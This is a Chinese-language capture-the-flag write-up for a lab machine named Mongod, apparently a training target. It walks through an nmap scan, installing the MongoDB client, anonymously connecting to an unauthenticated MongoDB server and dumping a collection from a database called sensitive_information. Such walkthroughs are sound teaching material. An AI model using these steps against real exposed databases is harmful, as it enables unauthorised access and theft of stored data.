# Mongod

## 前言

从Mongod的名字可以知道今日靶机和数据库有关。具体是什么数据库呢？没错就是MongoDB数据库，这是一个面向文档的 [No SQL](https://www.runoob.com/mongodb/nosql.html) 数据库。稍后我们会再提及。

> 靶机上运行着一个MongoDB数据库，存在未授权访问漏洞。即允许用户在没有账号、密码的情况下匿名地登录数据库。

接下来开始正式的渗透过程。

## 渗透

首先，我们例行公事般地扫描一下靶机开放的端口、服务等。祭出我们的 Nmap 神器，本次实验主要用到以下几个选项：

```bash
-p- ：扫描0-65535 间的TCP端口
-sV ：扫描特定端口上运行服务的版本信息
--min-rate ：指明 Nmap 每秒应发送的最小数据包数，该数越大，扫描速度越快
```

使用以下命令扫描目标：

```bash
sudo nmap -p- --min-rate=1000 -sV {target_ip}
```

可以发现靶机上运行着MongoDB服务，下面再简单说说 MongoDB。

![1](image-20230415192524848.png)

### MongoDB 简介

前文提到，MongoDB 是一个面向文档的非关系型数据库。MongoDB 不像传统的使用表和行的关系型数据库，其使用集合以及文档。

MongoDB 数据库由多个集合组成，每个集合又可包含多个文档：

![1.png](image-20230415191225105.png)

而每个文档又由一个个的键值对组成，键值对是 MongoDB 数据库数据的基本单元。

### 连接 MongoDB 数据库服务器

为连接到远程的 MongoDB 服务器，我们需要安装 `mongodb` 工具。

在基于 Debian 的linux发行版系统，可以使用以下命令安装 `mongodb`：

1. 利用 curl 下载压缩包

```
curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz
```

2. 利用 tar 解压

```
tar xvf mongodb-linux-x86_64-3.4.7.tgz
```

3. 进入 mongodb 的 bin 目录

```
cd mongodb-linux-x86_64-3.4.7/bin
```

4. 执行mongo，匿名连接 MongoDB 服务器

```
./mongo mongodb://{target_IP}:27017
```

如下图，成功连接到 MongoDB 服务器：



使用如下命令列出 MongoDB 中的所有数据库：

```
show dbs;
```



之后可以使用use 命令选择某个数据库，并查询该数据库里的信息：

```
use sensitive_information;
```

用 show 命令列出上述数据库下的所有集合：

```
show collections;
```

发现有一个名为 `flag` 的集合，我们可以使用如下命令输出该集合中的内容：

```
db.flag.find().pretty();
db.flag.find() 也可以，加上 pretty() 更美观
```

![image-20230415193113792](image-20230415193113792.png)



